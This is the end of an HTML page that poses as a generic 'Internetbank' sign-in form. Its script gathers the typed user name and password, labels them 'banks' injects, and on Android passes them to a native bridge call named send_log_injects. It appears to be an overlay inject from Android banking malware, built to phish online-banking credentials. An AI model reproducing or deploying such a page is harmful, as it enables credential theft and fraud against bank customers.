        header {
            padding: 20px 40px;
            font-size: 24px;
            color: #fff;
        }

        section {
            padding: 20px;
        }

        .inForm {
            padding: 20px;
            background-color: #fff;
            border: 0;
            border-radius: 20px;
            overflow: hidden;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left:0;
            top: 50%;
            line-height: 0;
            color: #999999;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0em;
        }
        
        .cool-input__input:focus + .cool-input__placeholder {
            color: #000;
        }

        .input {
            width: 100%;
            border: 0;
            border-bottom: 1px solid #979797;
        }

        .input:focus {
            border-bottom: 2px solid #000;
        }

        .button {
            width: 100%;
            padding: 15px;
            font-size: 24px;
            border: 0;
            border-radius: 75px;
            margin-top: 20px;
            color: #fff;
            font-weight: 600;
            background-color: #e82148;
        }

        .button:disabled {
            background-color: #b3b7c0;
        }
    </style>
</head>
<body>
    <form onsubmit="return false">
        <header>
            Sign in
        </header>
        <section>
            <div class="inForm">
                <div class="cool-input">
                    <input type="text" id="login" name="login" onkeyup="check();" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">Internetbank user name</span>
                </div>
                <div class="cool-input">
                    <input type="password" id="password" name="password" onkeyup="check();" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">Internetbank password</span>
                </div>

                <span style="float: right;color: #979797;font-weight: 600;">Forgto?</span>

                <input type="submit" class="button" id="sendData" disabled value="login">
            </div>
        </section>
    </form>

    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData');

        function check() {
            if(login.value.length > 0 && password.value.length > 7) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = function() {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
</body>
</html>
